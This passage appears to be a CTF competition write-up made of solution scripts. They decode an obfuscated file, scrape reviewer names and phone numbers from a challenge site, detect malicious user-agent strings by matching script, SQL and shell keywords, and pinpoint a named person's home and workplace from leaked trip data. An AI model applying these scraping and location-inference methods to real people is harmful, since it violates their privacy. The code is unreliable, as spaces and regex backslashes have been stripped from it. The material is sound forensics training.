        j = (j + box[i]) % 256
        box[i], box[j] = box[j], box[i]
        t = (box[i] + box[j] + 15) % 256
        k = box[t]
        res.append(s ^ k)
    return  res

deftranslate(input):
    dict2 = "208EC37FD94165AB"
    dict1 = "0123456789abcdef"
    returninput.translate(str.maketrans(dict2, dict1))

defreverse_shellcode(output):
    output -= 7
    output ^= 0xb2
    low = (output >> 4) & 0xf
    high = output & 0xf
    input = (high << 4) | low
    returninput + 1

result = ""
withopen("./info_0c743b3.ori.en", "r") as f:
    content = f.readlines()

for line in content:
    l = line.replace("n", "")
    l = translate(l)
    sbox = rc4_init_sbox(key)
    dec_result = rc4_excrypt(bytes.fromhex(l), sbox)
    for i inrange(len(dec_result)):
        dec_result[i] = reverse_shellcode(dec_result[i])
    for i in dec_result:
        result += chr(i)

open("./info_0c743b3.ori", "wb").write(result.encode())
```



```
tshark -r test.pcapng -T fields -Y "http and http.request.uri.query.parameter contains "fl4g_1s_here"" -e "http.request.uri.query.parameter" > data.txt
```



```
tcp contains "upload" and http.request.method==POST
```



```
import requests
from bs4 import BeautifulSoup
import time
import pandas as pd

BASE_URL = "http://47.117.186.156:33088"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Cookie": "PHPSESSID=meth5ucqp7rc26dtbvf93qof2g",  # 替换为你自己的
}

# 所有评论结果会保存在这个列表里
data = []

defget_product_ids(page=1):
    url = f"{BASE_URL}/index.php?controller=home&action=index&page={page}"
    res = requests.get(url, headers=HEADERS)
    soup = BeautifulSoup(res.text, 'html.parser')
    product_cards = soup.select('.product-card')
    product_ids = [card['data-id'] for card in product_cards]
    return product_ids

defget_comments(product_id):
    url = f"{BASE_URL}/index.php?controller=product&action=detail&id={product_id}"
    res = requests.get(url, headers=HEADERS)
    soup = BeautifulSoup(res.text, 'html.parser')
    reviews = soup.select('.review-item')

    for review in reviews:
        try:
            user_id = review.select_one('.user-id').text.strip().replace("用户ID：", "")
            user_name = review.select_one('.reviewer-name').text.strip().replace("用户名：", "")
            phone = review.select_one('.reviewer-phone').text.strip().replace("联系电话：", "")
            comment = review.select_one('.review-content').text.strip()
            data.append({
                "user_id": int(user_id),
                "user_name": user_name,
                "phone": phone,
                "comment": comment
            })
        except Exception as e:
            print(f"解析评论失败: {e}")

defrun_scraper():
    total_pages = 84# 示例先爬5页，可以调整为 84
    for page inrange(1, total_pages + 1):
        print(f"爬取第 {page} 页商品列表...")
        product_ids = get_product_ids(page)
        for pid in product_ids:
            print(f" -> 获取商品 {pid} 评论")
            get_comments(pid)
            time.sleep(0.5)  # 防止请求过快被封
        time.sleep(1)

    # 保存结果
    df = pd.DataFrame(data)
    df.to_csv("raw_comments.csv", index=False, encoding='utf-8')
    print("✅ 数据已保存到 raw_comments.csv")

if __name__ == "__main__":
    run_scraper()
```



```
import pandas as pd
from snownlp import SnowNLP
import hashlib

# === 1. 加载爬虫结果 ===
df = pd.read_csv("raw_comments.csv", encoding='utf-8')

# === 2. 情感分析：snownlp ===
defpredict_sentiment(text):
    try:
        s = SnowNLP(str(text))
        # 返回值在0~1之间，>0.5是正向，<=0.5是负向
        return1if s.sentiments > 0.5else0
    except:
        return0# 默认负面

df['label'] = df['comment'].apply(predict_sentiment)

# === 3. MD5 签名 ===
defgenerate_signature(user_id, user_name, phone):
    raw = f"{user_id}{user_name}{phone}"
    return hashlib.md5(raw.encode('utf-8')).hexdigest()

df['signature'] = df.apply(lambda row: generate_signature(row['user_id'], row['user_name'], row['phone']), axis=1)

# === 4. 整理、排序、导出 ===
output_df = df[['user_id', 'label', 'signature']].sort_values(by='user_id')
output_df.to_csv("submit_1.csv", index=False, encoding='utf-8')

print("✅ submit_1.csv 已生成，准备提交平台评分！")
```



```
import requests
from bs4 import BeautifulSoup
import time
import pandas as pd

BASE_URL = "http://47.117.186.156:33088"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Cookie": "PHPSESSID=meth5ucqp7rc26dtbvf93qof2g"# 请替换为你的有效会话ID
}

all_products = []

defget_product_list(page=1):
    url = f"{BASE_URL}/index.php?controller=home&action=index&page={page}"
    res = requests.get(url, headers=HEADERS)
    soup = BeautifulSoup(res.text, "html.parser")
    product_cards = soup.select(".product-card")

    products = []
    for card in product_cards:
        try:
            product_id = int(card['data-id'])
            product_name = card.select_one('.product-name').text.strip()
            sales_text = card.select_one('.product-sales').text.strip()  # 月销量: XXX件
            sales_num = int(''.join(filter(str.isdigit, sales_text)))
        except Exception as e:
            print(f"解析首页产品失败: {e}")
            continue

        products.append({
            "product_id": product_id,
            "product_name": product_name,
            "sales": sales_num
        })
    return products

defget_product_comments(product_id):
    url = f"{BASE_URL}/index.php?controller=product&action=detail&id={product_id}"
    res = requests.get(url, headers=HEADERS)
    soup = BeautifulSoup(res.text, "html.parser")
    reviews = soup.select('.review-content')
    comments = [r.text.strip() for r in reviews]
    return comments

defrun_product_scraper():
    total_pages = 84# 建议先测试前 5 页，平台总页数是 84
    for page inrange(1, total_pages + 1):
        print(f"正在爬取第 {page} 页商品列表...")
        products = get_product_list(page)
        for p in products:
            print(f" -> 商品ID: {p['product_id']} 正在抓取评论...")
            comments = get_product_comments(p['product_id'])
            for comment in comments:
                all_products.append({
                    "product_id": p['product_id'],
                    "product_name": p['product_name'],
                    "sales": p['sales'],
                    "comment": comment
                })
            # 若无评论也要保留记录（用于后续生成 reviews_number = 0）
            ifnot comments:
                all_products.append({
                    "product_id": p['product_id'],
                    "product_name": p['product_name'],
                    "sales": p['sales'],
                    "comment": ""
                })
            time.sleep(0.3)
        time.sleep(1)

    # 保存为中间文件
    df = pd.DataFrame(all_products)
    df.to_csv("product_detail_data.csv", index=False, encoding='utf-8')
    print("✅ 爬取完成，数据已保存为 product_detail_data.csv")

if __name__ == "__main__":
    run_product_scraper()
```



```
import pandas as pd
import re
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.naive_bayes import MultinomialNB
from sklearn.preprocessing import LabelEncoder
from sklearn.pipeline import make_pipeline

# === 加载标注数据 ===
train_df = pd.read_csv("product_names_to_label.csv")  # 你标注的训练集
X_train = train_df['product_name']
y_train = train_df['category_id']

# 标签编码
label_encoder = LabelEncoder()
y_encoded = label_encoder.fit_transform(y_train)

# 构建模型（TF-IDF + MultinomialNB）
model = make_pipeline(
    TfidfVectorizer(),
    MultinomialNB()
)
model.fit(X_train, y_encoded)

# === 加载商品详情数据 ===
full_df = pd.read_csv("product_detail_data.csv")

# === 分类预测 ===
X_test = full_df['product_name']
y_pred_encoded = model.predict(X_test)
y_pred = label_encoder.inverse_transform(y_pred_encoded)
full_df['category_id'] = y_pred

# === 清洗销量 ===
defclean_sales(s):
    try:
        val = int(re.sub(r"D", "", str(s)))
        return val if val > 0else0
    except:
        return0

full_df['sales'] = full_df['sales'].apply(clean_sales)

# === 评论统计 ===
reviews = full_df.groupby('product_id')['comment'].apply(
    lambda x: x[x != ""].count()
).reset_index(name='reviews_number')

# === 整合 & 去重 ===
product_df = full_df.drop_duplicates(subset=['product_id'])[['product_id', 'sales', 'category_id']]
final_df = product_df.merge(reviews, on='product_id', how='left')
final_df['reviews_number'] = final_df['reviews_number'].fillna(0).astype(int)

# === 排序 & 导出 ===
final_df = final_df.sort_values(by='product_id')
final_df.to_csv("submit_2.csv", index=False, encoding='utf-8')
print("✅ submit_2.csv 已成功生成！")
```



```
import requests
from bs4 import BeautifulSoup
import pandas as pd
import time

BASE_URL = "http://47.117.186.156:33088"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Cookie": "PHPSESSID=meth5ucqp7rc26dtbvf93qof2g"# ⚠️ 替换为你的有效 Cookie
}

all_users = []

defget_product_ids(page):
    url = f"{BASE_URL}/index.php?controller=home&action=index&page={page}"
    res = requests.get(url, headers=HEADERS)
    soup = BeautifulSoup(res.text, 'html.parser')
    product_cards = soup.select('.product-card')
    return [card['data-id'] for card in product_cards]

defget_review_users(product_id):
    url = f"{BASE_URL}/index.php?controller=product&action=detail&id={product_id}"
    res = requests.get(url, headers=HEADERS)
    soup = BeautifulSoup(res.text, 'html.parser')
    reviews = soup.select('.review-item')

    for review in reviews:
        try:
            user_id = review.select_one('.user-id').text.replace("用户ID：", "").strip()
            phone = review.select_one('.reviewer-phone').text.replace("联系电话：", "").strip()
            user_agent = review.select_one('.user-agent').text.replace("使用设备：", "").strip()

            all_users.append({
                'user_id': int(user_id),
                'phone': phone,
                'user_agent': user_agent
            })
        except Exception as e:
            print(f"跳过一个评论，原因：{e}")

defrun_scraper():
    for page inrange(1, 85):  # 示例：先抓前5页商品（共84页）
        print(f"🛒 抓取商品列表页 {page}...")
        product_ids = get_product_ids(page)
        for pid in product_ids:
            print(f"   📦 商品ID {pid} - 抓取评论用户信息")
            get_review_users(pid)
            time.sleep(0.5)
        time.sleep(1)

    df = pd.DataFrame(all_users).drop_duplicates()
    df.to_csv("user_agent_data.csv", index=False, encoding='utf-8')
    print("✅ 数据已保存为 user_agent_data.csv")

if __name__ == "__main__":
    run_scraper()
```



```
import pandas as pd
import re

# === 读取数据 ===
df = pd.read_csv("user_agent_data.csv", encoding='utf-8')  # 修改为你的文件路径

# === 手机号脱敏 ===
defdesensitize(phone):
    phone = str(phone)
    iflen(phone) == 11and phone.isdigit():
        return phone[:3] + '****' + phone[-4:]
    return phone

df['desensitization'] = df['phone'].apply(desensitize)

# === 更宽松但稳健的恶意代码检测规则 ===
defis_malicious_ua(ua: str) -> bool:
    ua = str(ua).lower()

    # 精选高置信度攻击特征
    patterns = [
        r"<script.*?>.*?</script>",     # script标签
        r"alerts*(.*?)",             # alert()
        r"evals*(.*?)",              # eval()
        r"onerrors*=",                 # onerror=
        r"onloads*=",
        r"javascript:",

        r"b(selects+.*s+from|unions+select|drops+table|inserts+into|deletes+from)b",  # SQL结构
        r"b(select|insert|update|delete|drop|union|exec|sleep|like)b",
        # r"'[s]*or[s]*'1'='1",         # 常见注入语句
        r"b(cmd|powershell|sh|bash)b"# 命令执行
    ]

    for pattern in patterns:
        if re.search(pattern, ua, re.IGNORECASE):
            returnTrue
    returnFalse

# 应用检测
df['code_check'] = df['user_agent'].apply(lambda ua: 'FALSE'if is_malicious_ua(ua) else'TRUE')

# === 最终输出 submit_3.csv ===
submit_df = df[['user_id', 'desensitization', 'code_check']].sort_values(by='user_id')
submit_df.to_csv("submit_3.csv", index=False, encoding='utf-8')
print("✅ 成功生成 submit_3.csv，已完成脱敏与宽松恶意检测！")
```



```
import os
import sqlite3
from collections import defaultdict, Counter
from datetime import datetime
import folium

# 你的.db文件夹路径
DB_FOLDER = './某滴泄露的行程数据/'

# 判断是否为工作日
defis_weekday(date_str):
    try:
        return datetime.strptime(date_str, "%Y-%m-%d").weekday() < 5
    except:
        returnFalse

# 是否为工作地关键词
defis_workplace(name):
    returnany(kw in name for kw in ['园区', '大厦', '大楼'])

# 临时存储每个“张**”人员的行程数据
people = defaultdict(list)

# 遍历所有 .db 文件
for filename insorted(os.listdir(DB_FOLDER)):
    ifnot filename.endswith('.db'):
        continue
    db_path = os.path.join(DB_FOLDER, filename)
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT date, name, phone, latitude, longitude FROM location_data WHERE name LIKE '张__'")
        rows = cursor.fetchall()
        for row in rows:
            date, name, phone, lat, lng = row
            key = phone.strip()  # 以手机号为区分标识
            people[key].append({
                "date": date,
                "name": name,
                "phone": phone,
                "lat": float(lat),
                "lng": float(lng),
                "filename": filename
            })
    except Exception as e:
        print(f"读取 {filename} 出错：{e}")
    finally:
        conn.close()

# 对每个“张**”人员评估是否符合“张华强”通勤模式
candidate_scores = []
commute_data = {}

for phone, records in people.items():
    records.sort(key=lambda x: (x['date'], x['filename']))  # 排序模拟时间
    by_day = defaultdict(list)
    for r in records:
        by_day[r['date']].append(r)

    commute_days = 0
    home_locations = []
    work_locations = []
    work_names = []

    for date, logs in by_day.items():
        ifnot is_weekday(date) orlen(logs) < 2:
            continue
        start = logs[0]
        end = logs[-1]
        home_locations.append((round(start['lat'], 6), round(start['lng'], 6)))
        work_locations.append((round(end['lat'], 6), round(end['lng'], 6)))
        work_names.append(end['name'])
        commute_days += 1

    if commute_days < 5:
        continue# 过滤通勤太少的

    # 统计出现频率最高的 home、work 地点
    home_common = Counter(home_locations).most_common(1)
    work_common = Counter(work_locations).most_common(1)
    work_named_common = Counter(work_names).most_common(1)

    workplace_match = is_workplace(work_named_common[0][0])
    score = commute_days + (5if workplace_match else0) + home_common[0][1]

    candidate_scores.append((score, phone, home_common[0][0], work_common[0][0], work_named_common[0][0]))
    commute_data[phone] = {
        "home": home_common[0][0],
        "work": work_common[0][0],
        "work_name": work_named_common[0][0],
        "paths": list(zip(home_locations, work_locations))
    }

# 选出得分最高的候选人作为“张华强”
best = sorted(candidate_scores, reverse=True)[0]
_, best_phone, home_loc, work_loc, work_name = best
paths = commute_data[best_phone]["paths"]

# 打印结果
print("🔍 推测张华强身份如下：")
print(f"手机：{best_phone}")
print(f"🏡 居住地坐标：{home_loc}")
print(f"🏢 工作地坐标：{work_loc}")
print(f"工作地点名称：{work_name}")

# 🗺 可视化地图生成
m = folium.Map(location=home_loc, zoom_start=12)

# 居住地标记
folium.Marker(location=home_loc, popup="🏡 居住地", icon=folium.Icon(color='green', icon='home')).add_to(m)

# 工作地标记
folium.Marker(location=work_loc, popup=f"🏢 工作地：{work_name}", icon=folium.Icon(color='red', icon='briefcase')).add_to(m)

# 画线
for home, work in paths[:100]:
    folium.PolyLine([home, work], color='blue', weight=1, opacity=0.4).add_to(m)

# 保存地图
m.save("张华强_行程地图.html")
print("✅ 地图保存为：张华强_行程地图.html")

# python solve1.py
# 🔍 推测张华强身份如下：
# 手机：138****9377
# 🏡 居住地坐标：(14.445597, 51.019517)
# 🏢 工作地坐标：(14.447202, 51.02654)
# 工作地点名称：张**
# ✅ 地图保存为：张华强_行程地图.html

# 华润国际E区:闵行区星辰信息技术园
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-8a2489fe3156a069f7b84e1a9215575f.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-69b070cc08362fbb6a4fd463ffd5ece3.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-267ee0c807079929dbb54ac6ce0022ed.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-903d2ef77ef43d928acf35cd4185213f.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-d8ccfe9d56e955078ec2ef09da9a0999.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-70f7b851edda061a63d5c32a0458b35a.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-415094ffd6dc208392f0e771a164a062.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-28ca1f48b954f8c37b4e4f8b5320c320.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-bf10270f2a726cb5138bf4e81ddcdac3.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-dddf7823a3e56a6c74db37415fa55962.png)